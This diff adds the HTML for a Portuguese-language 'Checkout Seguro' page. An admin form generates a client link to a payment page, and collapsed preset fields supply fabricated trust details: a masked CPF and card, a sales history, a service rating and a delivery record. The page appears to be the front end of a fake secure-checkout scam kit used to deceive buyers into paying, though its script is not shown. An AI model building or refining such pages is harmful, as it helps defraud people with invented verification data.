@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Checkout Seguro</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+  <div id="admin-view" class="view-section" style="display:none;">
+    <form id="adminForm">
+      <h2 class="admin-title">Novo Pedido Seguro</h2>
+
+      <label>Nome do Comprador</label>
+      <input type="text" name="comprador" required placeholder="Nome completo">
+
+      <label>Link Pagamento (Checkout)</label>
+      <input type="text" name="linkPagamento" id="linkPagamento" placeholder="Carregando último link...">
+
+      <label>Taxa de Serviço</label>
+      <input type="text" name="taxa" class="money" placeholder="R$ 0,00">
+
+      <div id="preset-toggle" class="toggle-header">
+          <p>DADOS PRÉ-DEFINIDOS</p>
+          <i id="toggle-icon" class="fa-solid fa-chevron-down toggle-icon"></i>
+      </div>
+
+      <div id="preset-fields-container" class="collapsed">
+        <label>Valor Total</label>
+        <input type="text" name="valor" class="money" value="R$ 1.000,00">
+
+        <label>Prazo</label>
+        <input type="text" name="prazo" value="12 horas">
+
+        <label>Frete</label>
+        <input type="text" name="frete" class="money" value="R$ 0,00">
+
+        <label>Tarifa da Plataforma</label>
+        <input type="text" name="tarifa" class="money" value="R$ 0,00">
+
+        <label>CPF Mascarado</label>
+        <input type="text" name="cpf" value="406.***.***.01">
+
+        <label>Cartão Mascarado</label>
+        <input type="text" name="cartao" value="Mastercard 4588">
+
+        <label>Histórico de Vendas</label>
+        <input type="text" name="vendas" value="08 Vendas nos últimos 06 meses">
+
+        <label>Avaliação Atendimento</label>
+        <input type="text" name="atendimento" value="Avaliação 4.7/5.0">
+
+        <label>Taxa de Entrega</label>
+        <input type="text" name="entrega" value="Taxa de entregues no prazo 07/08">
+      </div>
+      
+      <button type="submit" id="btnSalvar">Gerar Link do Cliente</button>
+    </form>
+
+    <div class="modal" id="modalSuccess">
+      <div class="modal-box">
+        <h3 style="color:#00bfa5; margin-top:0;">Link Gerado com Sucesso!</h3>
+        <p style="color:#aaa; font-size:14px;">Envie este link para o cliente.</p>
+
+        <div class="link-display" id="finalLink">...</div>
+
+        <div class="actions-grid">
+          <button class="btn-action btn-copy" id="btnCopy">
+            <i class="fa-regular fa-copy"></i> Copiar
+          </button>
+          <a href="#" target="_blank" class="btn-action btn-view" id="btnView">
+            <i class="fa-solid fa-external-link-alt"></i> Visualizar
+          </a>
+        </div>
+
+        <button class="btn-action btn-new" onclick="location.reload()">Criar Novo Pedido</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="client-view" class="view-section" style="display:none;">
+    <div id="client-content-area">
+      <div style="color:#fff; text-align:center; margin-top:50px;">
+        <i class="fa-solid fa-circle-notch fa-spin" style="font-size:30px; color:#00bfa5;"></i>
+        <p>Carregando detalhes da transação...</p>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
